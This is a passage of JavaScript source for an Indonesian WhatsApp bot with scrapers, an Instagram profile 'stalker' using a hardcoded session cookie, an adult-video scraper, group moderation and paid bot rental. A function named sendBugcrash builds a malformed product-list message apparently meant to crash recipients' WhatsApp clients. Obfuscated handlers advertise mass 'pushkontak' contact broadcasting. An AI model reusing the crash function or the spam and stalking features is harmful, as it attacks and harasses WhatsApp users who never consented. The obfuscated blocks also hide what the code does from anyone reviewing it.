let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

async function quotesanime () {
    return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 184)
        axios.get('https://otakotaku.com/quote/feed/'+page)
        .then(({ data }) => {
            const $ = cheerio.load(data)
            const hasil = []
            $('div.kotodama-list').each(function(l, h) {
                hasil.push({
                    link: $(h).find('a').attr('href'),
                    gambar: $(h).find('img').attr('data-src'),
                    karakter: $(h).find('div.char-name').text().trim(),
                    anime: $(h).find('div.anime-title').text().trim(),
                    episode: $(h).find('div.meta').text(),
                    up_at: $(h).find('small.meta').text(),
                    quotes: $(h).find('div.quote').text().trim()
                })
            })
            resolve(hasil)
        }).catch(reject)
    })
}

async function cerpen (category) {
	return new Promise(async (resolve, reject) => {
        let title = category.toLowerCase().replace(/[()*]/g, "")
        let judul = title.replace(/\s/g, "-")
        let page = Math.floor(Math.random() * 5)
        axios.get('http://cerpenmu.com/category/cerpen-'+judul+'/page/'+page)
        .then((get) => {
            let $ = cheerio.load(get.data)
            let link = []
            $('article.post').each(function (a, b) {
                link.push($(b).find('a').attr('href'))
            })
            let random = link[Math.floor(Math.random() * link.length)]
            axios.get(random)
            .then((res) => {
                let $$ = cheerio.load(res.data)
                let hasil = {
                    title: $$('#content > article > h1').text(),
                    author: $$('#content > article').text().split('Cerpen Karangan: ')[1].split('Kategori: ')[0],
                    kategori: $$('#content > article').text().split('Kategori: ')[1].split('\n')[0],
                    lolos: $$('#content > article').text().split('Lolos moderasi pada: ')[1].split('\n')[0],
                    cerita: $$('#content > article > p').text()
                }
                resolve(hasil)
            })
        })
    })
}

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        );
        const result = {
            status: 200,
            author: `Fahrul`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}

async function hentaivid() {
    return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 1153)
        axios.get('https://sfmcompile.club/page/'+page)
        .then((data) => {
            const $ = cheerio.load(data.data)
            const hasil = []
            $('#primary > div > div > ul > li > article').each(function (a, b) {
                hasil.push({
                    title: $(b).find('header > h2').text(),
                    link: $(b).find('header > h2 > a').attr('href'),
                    category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
                    share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
                    views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
                    type: $(b).find('source').attr('type') || 'image/jpeg',
                    video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
                    video_2: $(b).find('video > a').attr('href') || ''
                })
            })
            resolve(hasil)
        })
    })
}

async function igstalk(Username) {
  return new Promise((resolve, reject) => {
    axios.get('https://dumpor.com/v/'+Username, {
      headers: {
        "cookie": "_inst_key=SFMyNTY.g3QAAAABbQAAAAtfY3NyZl90b2tlbm0AAAAYWGhnNS1uWVNLUU81V1lzQ01MTVY2R0h1.fI2xB2dYYxmWqn7kyCKIn1baWw3b-f7QvGDfDK2WXr8",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
      }
    }).then(res => {
      const $ = cheerio.load(res.data)
      const result = {
        profile: $('#user-page > div.user > div.row > div > div.user__img').attr('style').replace(/(background-image: url\(\'|\'\);)/gi, ''),
        fullname: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > a > h1').text(),
        username: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > h4').text(),
        post: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(1)').text().replace(' Posts',''),
        followers: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(2)').text().replace(' Followers',''),
        following: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(3)').text().replace(' Following',''),
        bio: $('#user-page > div.user > div > div.col-md-5.my-3 > div').text()
      }
      resolve(result)
    })
  })
}

async function sendBugcrash(jid, title, description, footer, thumbnail, ownerBusines, produk, productIdImg) {
let prod = {
listMessage: {
title: title,
description: description,
listType: 2,
productListInfo: {
productSections: [{
title: title,
products: produk
}],
headerImage: {
productId: productIdImg,
jpegThumbnail: thumbnail
},
businessOwnerJid: ownerBusines
},
footerText: footer,
}
}
let progene = await generateWAMessageFromContent(jid, prod, { quoted : troli })
return Zeltoria.relayMessage(progene.key.remoteJid, progene.message, {
messageId: ""
})
}

async function replyprem(teks) {
    reply(`Fitur Ini Khusus Premium Kak, Hubungin Owner Untuk Menjadi Premium`)
}

if (/hehe/g.test(m.body)) {
let reactionMessage = proto.Message.ReactionMessage.create({ key: m.key, text: "" })
Zeltoria.relayMessage(m.chat, { reactionMessage }, { messageId: "ppppp" })
}

if (autodltt) {
console.log("Auto Downloader Detected")
if (/(?:http(?:s|):\/\/|)(?:www\.|)(?:tiktok.com)\/@([-_0-9A-Za-z\.]{3,20})\/video\/([0-9]{19,25})?.(?:sender_device=pc&sender_web_id=[0-9]{19,25})&.(?:s_from_webapp=v1&is_copy_url=[0-9]{1})|(?:http(?:s|)):\/\/(?:(?:vt.|vm.)tiktok.com)\/(?:[a-z0-9A-Z]{9,15}\/)|(?:http(?:s|)):\/\/(?:t.tiktok.com)\/(?:i18n\/share\/video)\/([&\?\/a-zA-Z0-9=_-]{333,400})/.test(body) && !body.startsWith(prefix)) {
url = body.match(/(?:http(?:s|):\/\/|)(?:www\.|)(?:tiktok.com)\/@([-_0-9A-Za-z\.]{3,20})\/video\/([0-9]{19,25})?.(?:sender_device=pc&sender_web_id=[0-9]{19,25})&.(?:s_from_webapp=v1&is_copy_url=[0-9]{1})|(?:http(?:s|)):\/\/(?:(?:vt.|vm.)tiktok.com)\/(?:[a-z0-9A-Z]{9,15}\/)|(?:http(?:s|)):\/\/(?:t.tiktok.com)\/(?:i18n\/share\/video)\/([&\?\/a-zA-Z0-9=_-]{333,400})/)[0] 
let atdl = await tiktok(url)
let buttons = [
{ buttonId: `.tiktokvideo ${url}`, buttonText: { displayText: 'Video' }, type: 1 },
{ buttonId: `.tiktokaudio ${url}`, buttonText: { displayText: 'Audio' }, type: 1 }
]
await Zeltoria.sendButtonText(m.chat, buttons, `Auto Download Tiktok

Title : ${atdl.meta.title}
Duration : ${atdl.meta.duration}
Source : ${atdl.meta.source}`, `Auto Downloader By Fahrul`, ftext)
}
}

if (autosticker) {
if (/image/.test(mime) && !/webp/.test(mime)) {
let media = await quoted.download()
let encmedia = await Zeltoria.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime) && !/webp/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 Detik!')
let media = await quoted.download()
let encmedia = await Zeltoria.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
}
}

if (m.isGroup && !m.key.fromMe && !IniZeltoria && antilink) {
if (!isBotAdmins) return
if (budy.match(`chat.whatsapp.com`)) {
Zeltoria.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
Zeltoria.groupParticipantsUpdate(m.chat, [sender], 'remove')
}
}

if (m.isGroup && !m.key.fromMe && !IniZeltoria && antiwame) {
if (!isBotAdmins) return
if (budy.match(`wa.me`)) {
Zeltoria.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
Zeltoria.groupParticipantsUpdate(m.chat, [sender], 'remove')
}
}

if (!isCmd && m.isGroup && isAlreadyResponList(m.chat, chath, db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, chath, db_respon_list)
if (get_data_respon.isImage === false) {
Zeltoria.sendMessage(m.chat, { text: sendResponList(m.chat, chath, db_respon_list) }, { quoted: m })
} else {
buff = await getBuffer(get_data_respon.image_url)
Zeltoria.sendImage(m.chat, buff, `${get_data_respon.response}`, m)
}
}

const nebal = (angka) => {
return Math.floor(angka)
}

if (!isCmd && isAlreadyZeltoriaList(chath, dblist)) {
var getraindata = getDataZeltoriaList(chath, dblist)
if (getraindata.isImage === false) {
Zeltoria.sendMessage(m.chat, { text: sendZeltoriaList(chath, dblist) }, { quoted: m })
} else {
buff = await getBuffer(getraindata.image_url)
Zeltoria.sendImage(m.chat, buff, `${getraindata.response}`, m)
}
}

const seactions = [{
title: `Silahkan Pilih Salah Satu`,
rows: [
{title: `⊟ Semua Menu`, rowId: `${prefix}allmenu`},
{title: `⊟ AI Menu`, rowId: `${prefix}aimenu`},
{title: `⊟ Internet Menu`, rowId: `${prefix}downloadmenu`},
{title: `⊟ Ephoto360 Maker`, rowId: `${prefix}ephoto360menu`},
{title: `⊟ Fun Menu`, rowId: `${prefix}funmenu`},
{title: `⊟ Group Menu`, rowId: `${prefix}groupmenu`},
{title: `⊟ Owner Menu`, rowId: `${prefix}ownermenu`},
{title: `⊟ Other Menu`, rowId: `${prefix}othermenu`},
{title: `⊟ PhotoOxy Maker`, rowId: `${prefix}photooxymenu`},
{title: `⊟ Random Cerpen`, rowId: `${prefix}cerpenmenu`},
{title: `⊟ Random Foto`, rowId: `${prefix}randfotomenu`},
{title: `⊟ Random Quotes`, rowId: `${prefix}randomtext`},
{title: `⊟ Random Video`, rowId: `${prefix}randvideomenu`},
{title: `⊟ Stalker Menu`, rowId: `${prefix}stalkermenu`},
{title: `⊟ TextPro Maker`, rowId: `${prefix}textpromenu`},
]}]
const listMenuMessage = { 
text: `Silahkan Kak @${sender.split("@")[0]} Pencet Button List Message Nya Di Bawah Ya`,
mentions: [sender],
footer: fake,
buttonText: 'List Button By Fahrul',
sections: seactions,
listType: 1}
//fitur case
switch (command) {
case 'jadibot': {
if (m.isGroup) return reply(mess.private)
if (!isPrem) return replyprem(mess.premium)
jadibot(Zeltoria, m, from)
}
break
case 'berhasil_jadi_bot':
        // if (!itsMe) return;
        const noSender = sender.split('@')[0].slice(-4);
        // const currentStatus = await Zeltoria.fetchStatus(from);
        let newStatus = `Hi, im BOT => BOT ID : ${noSender})`;
        await Zeltoria.updateProfileStatus(newStatus);

        await Zeltoria
          .groupAcceptInvite(gcCode)
          .then((res) => reply(JSON.stringify(res, null, 2)))
          .catch((err) => reply(JSON.stringify(err, null, 2)));
        reply('BERHASIL MEMULAI BOT : 200 OK');
        break;
      case 'jadibot':
        {
          // if (m.isGroup) return reply(mess.private);

          //BUTTON MESSAGE
          let caption = `Dalam proses.. tunggu 5 detik..\n\nJika QR tidak muncul, silahkan klik tombol dibawah ini\n`; // caption
          let buttonsJadibot = [
            {
              buttonId: `${prefix}stopjadibot`,
              buttonText: { displayText: 'STOP JADI BOT' },
              type: 1,
            },
          ];

          let buttonMessage = {
            location: { jpegThumbnail: thumb },
            caption: caption,
            mentions: [sender, creator, mark],
            footer: `Created By @${creator.split('@')[0]}\nGC ${linkGc}`,
            buttons: buttonsJadibot,
            headerType: 'LOCATION',
          };
          await Zeltoria.sendMessage(from, buttonMessage, { quoted: m });
          //BUTTON MESSAGE
          console.log('START RUN JADIBOT');
          let botPushname = pushname;
          const runJadibot = await jadibot(Zeltoria, m, from, botNumber, sender);
        }
        break;
      case 'listjadibot':
        try {
          let user = [
            ...new Set([
              ...global.conns.filter((Zeltoria) => Zeltoria.user).map((Zeltoria) => Zeltoria.user),
            ]),
          ];
          te = '*List Jadibot*\n\n';
          for (let i of user) {
            y = await Zeltoria.decodeJid(i.id);
            te += ' × User : @' + y.split('@')[0] + '\n';
            te += ' × Name : ' + i.name + '\n\n';
          }
          Zeltoria.sendMessage(from, { text: te, mentions: [y] }, { quoted: m });
        } catch (err) {
          reply(`Belum Ada User Yang Jadibot`);
        }
        break;
case 'listjadibot': 
try {
let user = [... new Set([...global.conns.filter(Zeltoria => Zeltoria.user).map(Zeltoria => Zeltoria.user)])]
te = "*List Jadibot*\n\n"
for (let i of user){
y = await Zeltoria.decodeJid(i.id)
te += " × User : @" + y.split("@")[0] + "\n"
te += " × Name : " + i.name + "\n\n"
}
Zeltoria.sendMessage(from,{text:te,mentions: [y], },{quoted:m})
} catch (err) {
reply(`Belum Ada User Yang Jadibot`)
}
break
case "owner": {
const repf = await Zeltoria.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Kontak`, 
contacts: list }, contextInfo: {
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid: [sender]
}}, { quoted: voll })
Zeltoria.sendMessage(from, { text : `Hai Kak @${sender.split("@")[0]}, Nih Owner Ku Jangan Macam-macam Ya`, mentions: [sender], contextInfo:{
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid:[sender]
}}, { quoted: repf })
}
break
case "menu": {
var _0x42bb97=_0x4b45;function _0x4b45(_0xf06b68,_0xbaef78){var _0x231a59=_0x231a();return _0x4b45=function(_0x4b455b,_0x49cefd){_0x4b455b=_0x4b455b-0xa9;var _0x3defff=_0x231a59[_0x4b455b];return _0x3defff;},_0x4b45(_0xf06b68,_0xbaef78);}function _0x231a(){var _0x22b491=['owner\x0a\x0a│⭔','42450pRAquv','creator','1551982XgdHYs','\x0a\x0aSaya\x20*CHAT\x20BOTz*\x0a\x0aLayanan\x20Pesan\x20Siaran\x20Keseluruh\x20GRUP🌟\x0a\x0aSILAHKAN\x20PILIH\x20MENU\x20DI\x20BAWAH\x20⬇️\x20\x0a\x0a╭─────═[\x20*INFO\x20BOT*\x20]═─────⋆\x0a\x0a│╭───────────────···\x0a\x0a││☂︎\x20*BOT\x20NAME*\x20:\x20*','addprem\x20*(\x20Nomor\x20)*\x0a\x0a│⭔','210808UmTmGT','join\x20*(\x20Linkgc\x20)*\x0a\x0a│⭔','81EchwAt','sendMessage','jadibot\x0a\x0a│⭔','kick\x0a\x0a│⭔','*\x0a\x0a││☂︎\x20*BY*\x20:\x20','57hTobXY','tagall\x0a\x0a│⭔','723005mAvOox','split','973wNTiav','delown\x20*(\x20Nomor\x20)*\x0a\x0a│⭔','listpremium\x0a\x0a│⭔','300398urndxo','10167800yXmQyU','\x0a\x0a*Hallo\x20Kak👋*\x20@','\x0a\x0a│╰────────────────···\x0a\x0a┠─────═[\x20*FITUR\x20BOTZ*\x20]═─────⋆\x0a\x0a│⭔','listgroup\x0a\x0a│⭔','runtime\x0a\x0a│⭔','101580WLuytc','listjadibot\x0a\x0a│⭔','addown\x20*(\x20Nomor\x20)*\x0a\x0a│⭔','delprem\x20*(\x20Nomor\x20)*\x0a\x0a│⭔','botstatus\x0a\x0a│⭔','hidetag\x0a\x0a│⭔','antilink\x20on/off\x0a\x0a│⭔'];_0x231a=function(){return _0x22b491;};return _0x231a();}(function(_0x975485,_0x31c456){var _0x3f0f1b=_0x4b45,_0x1af3a8=_0x975485();while(!![]){try{var _0x30f8f0=parseInt(_0x3f0f1b(0xb1))/0x1+parseInt(_0x3f0f1b(0xc1))/0x2+-parseInt(_0x3f0f1b(0xaa))/0x3*(parseInt(_0x3f0f1b(0xb7))/0x4)+-parseInt(_0x3f0f1b(0xac))/0x5+parseInt(_0x3f0f1b(0xbf))/0x6*(parseInt(_0x3f0f1b(0xae))/0x7)+parseInt(_0x3f0f1b(0xc4))/0x8*(parseInt(_0x3f0f1b(0xc6))/0x9)+-parseInt(_0x3f0f1b(0xb2))/0xa;if(_0x30f8f0===_0x31c456)break;else _0x1af3a8['push'](_0x1af3a8['shift']());}catch(_0x2d3110){_0x1af3a8['push'](_0x1af3a8['shift']());}}}(_0x231a,0x9f71f),txt5=sayyingTime+_0x42bb97(0xb3)+sender[_0x42bb97(0xad)]('@')[0x0]+_0x42bb97(0xc2)+global['botName']+_0x42bb97(0xa9)+global[_0x42bb97(0xc0)]+_0x42bb97(0xb4)+prefix+_0x42bb97(0xbe)+prefix+_0x42bb97(0xbc)+prefix+_0x42bb97(0xab)+prefix+_0x42bb97(0xb5)+prefix+_0x42bb97(0xc5)+prefix+'pushkontak\x20*(\x20ID\x20|\x20Teks\x20)*\x0a\x0a│⭔'+prefix+'pushkontakv2\x20*(\x20Teks\x20)*\x0a\x0a│⭔'+prefix+_0x42bb97(0xc8)+prefix+_0x42bb97(0xb8)+prefix+_0x42bb97(0xbd)+prefix+_0x42bb97(0xc9)+prefix+_0x42bb97(0xb9)+prefix+_0x42bb97(0xaf)+prefix+_0x42bb97(0xc3)+prefix+_0x42bb97(0xba)+prefix+_0x42bb97(0xb0)+prefix+'listsewa\x0a\x0a│⭔'+prefix+_0x42bb97(0xbb)+prefix+'ping\x0a\x0a│⭔'+prefix+_0x42bb97(0xb6)+prefix+'speedtest\x0a\x0a│⭔'+prefix+'tiktok\x20link\x0a\x0a│⭔'+prefix+'sticker\x20(Reply/caption)\x0a\x0a╰───────────────────────˧\x0a\x0a',await Zeltoria[_0x42bb97(0xc7)](from,{'image':thumb,'caption':txt5,'mentions':[sender]},{'quoted':voll}));
}
break
case 'speedtest': {
reply('Testing Speed...')
let cp = require('child_process')
let { promisify } = require('util')
let exec = promisify(cp.exec).bind(cp)
let o
try {
o = await exec('python3 speed.py')
} catch (e) {
o = e
} finally {
let { stdout, stderr } = o
if (stdout.trim()) reply(stdout)
if (stderr.trim()) reply(stderr)
}
}
break

case 'addowner':
const _0x313556=_0x5975;function _0x1d8a(){const _0x37d88=['owner','\x20Telah\x20Menjadi\x20Owner!!!','1493165BPIMUP','1530926PtXGyh','\x20nomor\x0aContoh\x20','./database/owner.json','@s.whatsapp.net','833qGoIjY','push','43096IrSMXs','writeFileSync','3015695dsNYCK','split','onWhatsApp','1221426vbAyZW','\x206285798145596','length','Penggunaan\x20','947816FVFciD','stringify','3EMKMzv','20LDvxbI','19779516cUijkO'];_0x1d8a=function(){return _0x37d88;};return _0x1d8a();}(function(_0x1b3af6,_0x5e2418){const _0x4348c1=_0x5975,_0x5556f7=_0x1b3af6();while(!![]){try{const _0x4aa5f9=-parseInt(_0x4348c1(0x13f))/0x1+-parseInt(_0x4348c1(0x140))/0x2+-parseInt(_0x4348c1(0x13a))/0x3*(-parseInt(_0x4348c1(0x138))/0x4)+-parseInt(_0x4348c1(0x148))/0x5+-parseInt(_0x4348c1(0x134))/0x6+-parseInt(_0x4348c1(0x144))/0x7*(parseInt(_0x4348c1(0x146))/0x8)+parseInt(_0x4348c1(0x13c))/0x9*(parseInt(_0x4348c1(0x13b))/0xa);if(_0x4aa5f9===_0x5e2418)break;else _0x5556f7['push'](_0x5556f7['shift']());}catch(_0xb63f38){_0x5556f7['push'](_0x5556f7['shift']());}}}(_0x1d8a,0xe213b));if(!IniZeltoria)return reply(mess[_0x313556(0x13d)]);if(!args[0x0])return reply(_0x313556(0x137)+(prefix+command)+_0x313556(0x141)+(prefix+command)+_0x313556(0x135));bnnd=q[_0x313556(0x149)]('|')[0x0]['replace'](/[^0-9]/g,'');let ceknye=await Zeltoria[_0x313556(0x133)](bnnd+_0x313556(0x143));function _0x5975(_0x58eece,_0x44d3ba){const _0x1d8ae7=_0x1d8a();return _0x5975=function(_0x5975df,_0x5494b7){_0x5975df=_0x5975df-0x133;let _0x32e3e0=_0x1d8ae7[_0x5975df];return _0x32e3e0;},_0x5975(_0x58eece,_0x44d3ba);}if(ceknye[_0x313556(0x136)]==0x0)return reply('Masukkan\x20Nomor\x20Yang\x20Valid\x20Dan\x20Terdaftar\x20Di\x20WhatsApp!!!');owner[_0x313556(0x145)](bnnd),fs[_0x313556(0x147)](_0x313556(0x142),JSON[_0x313556(0x139)](owner)),reply('Nomor\x20'+bnnd+_0x313556(0x13e));
break
case 'delowner':
if (!IniZeltoria) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281916619735`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
reply(`Nomor ${ya} Telah Di Hapus Owner!!!`)
break
case 'listpremium':
teks = '*List Premium*\n\n'
for (let Zeltoria of prem) {
teks += `- ${Zeltoria}\n`
}
teks += `\n*Total : ${prem.length}*`
Zeltoria.sendMessage(m.chat, { text: teks.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": prem } })
break


case "listsewa": {
txt6 = `Hallo Kak @${sender.split("@")[0]}, Mau Sewa? List Di Bawah

╭━━━━「 *SEWA BOT* 」
┊⫹⫺ *Hemat:* _7K/grup (1 Hari)_
┊⫹⫺ *Normal:* _30K/grup (1 bulan)_                                         
┊⫹⫺ *VIP⭐:* = _35K/grup ( PERMANEN )_
╰═┅═━––––––๑

*⫹⫺ PAYMENT:*
GOPAY | DANA | OVO | QRIS

*Note 📝:* 
_- Push Kontak Otomatis_
_- BOT ON 24 JAM_
_- BOT FAST RESPON_

Note : Jika Minat Chat @${creator.split("@")[0]}`
Zeltoria.sendMessage(from, { text: txt6, mentions:[sender, Zeltoria]}, {quoted:m})
}
break
case "listgroup": {
const _0x1a59fe=_0x3a5a;function _0x3a5a(_0x23db50,_0x485dfc){const _0x66719d=_0x6671();return _0x3a5a=function(_0x3a5aab,_0x4c1f74){_0x3a5aab=_0x3a5aab-0x1da;let _0x218b4a=_0x66719d[_0x3a5aab];return _0x218b4a;},_0x3a5a(_0x23db50,_0x485dfc);}(function(_0x228bc4,_0x415497){const _0x14ce2d=_0x3a5a,_0x5b5ae3=_0x228bc4();while(!![]){try{const _0x3975bb=-parseInt(_0x14ce2d(0x1e0))/0x1+-parseInt(_0x14ce2d(0x1e4))/0x2+parseInt(_0x14ce2d(0x1f2))/0x3*(parseInt(_0x14ce2d(0x1f1))/0x4)+parseInt(_0x14ce2d(0x1f4))/0x5*(parseInt(_0x14ce2d(0x1ec))/0x6)+-parseInt(_0x14ce2d(0x1e7))/0x7*(-parseInt(_0x14ce2d(0x1ef))/0x8)+-parseInt(_0x14ce2d(0x1ee))/0x9*(-parseInt(_0x14ce2d(0x1df))/0xa)+-parseInt(_0x14ce2d(0x1de))/0xb*(parseInt(_0x14ce2d(0x1e8))/0xc);if(_0x3975bb===_0x415497)break;else _0x5b5ae3['push'](_0x5b5ae3['shift']());}catch(_0x5ebf87){_0x5b5ae3['push'](_0x5b5ae3['shift']());}}}(_0x6671,0x665ec));if(!isPrem)return Zeltoria[_0x1a59fe(0x1f5)](from,{'text':_0x1a59fe(0x1ed)+sender[_0x1a59fe(0x1e5)]('@')[0x0]+',\x20Kakak\x20Belum\x20Premium\x20Silahkan\x20Chat\x20@'+creator[_0x1a59fe(0x1e5)]('@')[0x0]+_0x1a59fe(0x1e9),'mentions':[sender,creator],'contextInfo':{'forwardingScore':0x174876e7ff,'isForwarded':!![],'mentionedJid':[sender,creator]}},{'quoted':voll});function _0x6671(){const _0x24c78c=['\x20Group\x0a\x0a','map','Untuk\x20Penggunaan\x20Silahkan\x20Ketik\x20Command\x20','513997vwJvNB','10mcyBEJ','683682yLdpJX','groupMetadata','\x0a│⭔\x20*ID\x20:*\x20','\x0a│⭔\x20*MEMBER\x20:*\x20','475758BiuQWB','split','length','5172629TQdBHD','84eobuBN','\x20Untuk\x20Membeli\x20Akses\x20User\x20Premium','⬣\x20*LIST\x20GROUP\x20DI\x20BAWAH*\x0a\x0aTotal\x20Group\x20:\x20','❏\x20Group\x20Ke\x20','724566yUGlOS','Maaf\x20Kak\x20@','167886gqZAms','8GpERnw','subject','8SmmnoQ','459828DYwxId','\x0a│⭔\x20*NAMA\x20:*\x20','25mmokRZ','sendMessage','entries'];_0x6671=function(){return _0x24c78c;};return _0x6671();}let getGroups=await Zeltoria['groupFetchAllParticipating'](),groups=Object[_0x1a59fe(0x1da)](getGroups)['slice'](0x0)[_0x1a59fe(0x1dc)](_0x3d6e55=>_0x3d6e55[0x1]),anu=groups[_0x1a59fe(0x1dc)](_0x356b1e=>_0x356b1e['id']),hituet=0x0,teks=_0x1a59fe(0x1ea)+anu[_0x1a59fe(0x1e6)]+_0x1a59fe(0x1db);for(let x of anu){let metadata2=await Zeltoria[_0x1a59fe(0x1e1)](x);teks+=_0x1a59fe(0x1eb)+(hituet+=0x1)+_0x1a59fe(0x1f3)+metadata2[_0x1a59fe(0x1f0)]+_0x1a59fe(0x1e2)+metadata2['id']+_0x1a59fe(0x1e3)+metadata2['participants'][_0x1a59fe(0x1e6)]+'\x0a╰────|\x0a\x0a';}reply(teks+(_0x1a59fe(0x1dd)+prefix+'pushkontak\x20id|teks\x0a\x0aSebelum\x20Menggunakan\x20Silahkan\x20Salin\x20Dulu\x20Id\x20Group\x20Nya\x20Di\x20Atas'));
}
break

case 'hidetag': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !IniZeltoria) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!q) return reply(`Teks?`)
Zeltoria.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break
case 'tagall': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !IniZeltoria) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!q) return reply(`Teks?`)
